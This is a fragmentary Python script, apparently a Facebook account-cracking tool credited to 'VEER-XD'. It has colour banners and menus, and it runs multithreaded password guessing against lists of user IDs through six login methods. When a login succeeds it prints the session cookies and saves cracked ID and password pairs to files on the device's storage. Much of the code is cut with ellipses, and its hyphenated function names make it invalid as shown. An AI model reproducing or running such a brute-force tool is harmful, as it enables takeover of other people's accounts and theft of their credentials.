#created by VEER-XD aka Aryan chaudhary
#open source by VEER-XD
#github= VEER.VEER
...
def uaku2():
	try:
		...
		a=requests.get('https://github.com/VEER.VEER/XD/blob/main/ua2.txt').text
		ua=open('.ua2.txt','w')
...
\033[1;32m \$$\$$ /  $$    __ |          $$    __|          $$  __   $$< 
 \033[1;31m \$$$   /   $$   |               $$   |               $$  |      $$ |
  \033[1;36m \$    /      $$$$$$$$\    $$$$$$$$\   $$ |      $$|
  \033[1;35m   \_/          \________ |      \________|     \__|      \__|                                                                                                                                               \033[1;31m███╗        ██╗ ██╗ █████╗     ███████╗  ██╗
...
def VEER-XD():
    ...
    aryan = input("✓CHOOSE>")
    if aryan =='1':VEER-XD1()
    elif aryan =='2':VEER-XD2()
    elif aryan =='3':VEER-XD3()
    elif aryan =='4':VEER-XD4()
    elif aryan =='5':VEER-XD5()
    elif aryan =='6':VEER-XD6()
...
def VEER-XD1():
	...
	print("[+]==============================================")
	VEER-XDlovesyou = input("[+] [CHOOSE] :- ")
	if VEER-XDlovesyou in ['y','Y','1','yes','YES','Yes']:
		VEER-XD_xd.append('y')
	else:
		VEER-XD_xd.append('n')
	print("[+]==============================================")
	...
	print("[+]==============================================")
	VEER-XDtop = input("[+] [CHOOSE] :- ")
	if VEER-XDtop in ['y','Y','Yes','YES','1']:
		baby.append('y')
	else:
		baby.append('n')
	with ThreadPool(max_workers=30) as yaari:
		...
		print(f'[+] METHOD CHOOSED : M{VEER-XDfire}')
		...
		for guru in user:
			...
			if VEER-XDfire =='1':yaari.submit(mbasic,uid,pwx,tl)
			elif VEER-XDfire =='2':yaari.submit(p,uid,pwx,tl)
			elif VEER-XDfire =='3':yaari.submit(x,uid,pwx,tl)
			elif VEER-XDfire =='4':yaari.submit(mobile,uid,pwx,tl)
			elif VEER-XDfire =='5':yaari.submit(freeq,uid,pwx,tl)
			elif VEER-XDfire =='6':yaari.submit(d,uid,pwx,tl)
			else:
	...
	print('[?] Ids saved in VEER-XD-OK.txt,VEER-XD-CP.txt')
...
def VEER-XD5():
	...
	with ThreadPool(max_workers=50) as manshera:
		...
		for love in user:
			...
			for Eman in HamiiID:
				pwx.append(Eman)
			if VEER-XDfire =='1':manshera.submit(mbasic,uid,pwx,tl)
			elif VEER-XDfire =='2':manshera.submit(p,uid,pwx,tl)
			elif VEER-XDfire =='3':manshera.submit(x,uid,pwx,tl)
			elif VEER-XDfire =='4':manshera.submit(mobile,uid,pwx,tl)
			elif VEER-XDfire =='5':manshera.submit(freeq,uid,pwx,tl)
			elif VEER-XDfire =='6':manshera.submit(d,uid,pwx,tl)
			else:
...
def mbasic(uid,pwx,tl):
    ...
    'upgrade-insecure-requests':'1',
			...
			if 'c_user' in log_cookies:
				...
				cid = coki[151:166]
				print('\33[1;92m[VEER-XD-OK] '+cid+' | '+ps+'\33[0;97m')
				if 'y' in VEER-XD_xd:
					print("\33[1;92m[💚] \33[1;98mCOOKIES : \33[1;92m"+coki)
					cek_apk(session,coki)
				else:
					break
				open('/sdcard/VEER-XD-OK.txt', 'a').write(cid+' | '+ps+'\n')
				oks.append(cid)
				break
				...
				cid = coki[141:156]
				if 'y' in baby:
					print('\33[1;91m[VEER-XD-CP] '+cid+' | '+ps+'\33[0;97m')
					open('/sdcard/VEER-XD-CP.txt', 'a').write(cid+' | '+ps+'\n')
					cps.append(cid)
					break
				else:
					open('/sdcard/VEER-XD-CP.txt', 'a').write(cid+' | '+ps+'\n')
				...
				continue
		loop+=1
		sys.stdout.write('\r\33[1;37m[M1-VEER-XD] %s|OK:%s CP:%s \r'%(loop,len(oks),len(cps))),
		sys.stdout.flush()
	except:
		pass
	...
	try:
		for ps in pwx:
			...
			if 'c_user' in log_cookies:
				...
				continue
		loop+=1
		sys.stdout.write('\r\33[1;37m[M2-VEER-XD] %s|OK:%s CP:%s \r'%(loop,len(oks),len(cps))),
		sys.stdout.flush()
	except:
		pass
...
def x(uid,pwx,tl):
    ...
    'upgrade-insecure-requests':'1',
			...
			if 'c_user' in log_cookies:
				...
				continue
		loop+=1
		sys.stdout.write('\r\33[1;37m[M3-VEER-XD] %s|OK:%s CP:%s \r'%(loop,len(oks),len(cps))),
		sys.stdout.flush()
	except:
		pass
...
def mobile(uid,pwx,tl):
    ...
    'upgrade-insecure-requests':'1',
			...
			if 'c_user' in log_cookies:
				...
				continue
		loop+=1
		sys.stdout.write('\r\33[1;37m[M4-VEER-XD] %s|OK:%s CP:%s \r'%(loop,len(oks),len(cps))),
		sys.stdout.flush()
	except:
		pass
...
def freeq(uid,pwx,tl):
    ...
    'upgrade-insecure-requests':'1',
			...
			if 'c_user' in log_cookies:
				...
				continue
		loop+=1
		sys.stdout.write('\r\33[1;37m[M5-VEER-XD] %s|OK:%s CP:%s \r'%(loop,len(oks),len(cps))),
		sys.stdout.flush()
	except:
		pass
...
def d(uid,pwx,tl):
    ...
    'upgrade-insecure-requests':'1',
			...
			if 'c_user' in log_cookies:
				...
				continue
		loop+=1
		sys.stdout.write('\r\33[1;37m[M6-VEER-XD] %s|OK:%s CP:%s \r'%(loop,len(oks),len(cps))),
		sys.stdout.flush()
	except:
		pass
